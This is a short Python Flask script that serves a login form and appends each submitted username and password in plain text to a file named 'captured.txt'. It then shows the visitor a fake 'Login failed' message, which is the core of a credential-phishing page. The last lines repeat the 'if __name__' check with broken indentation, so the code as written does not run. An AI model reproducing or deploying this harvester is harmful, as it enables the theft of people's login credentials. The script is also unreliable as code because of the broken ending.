from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        with open("captured.txt", "a") as f:
            f.write(f"{username} | {password}\n")

        return "Login failed. Please try again."

    return render_template("login.html")

if __name__ == "__main__":
   if __name__ == "__main__":
    app.run()

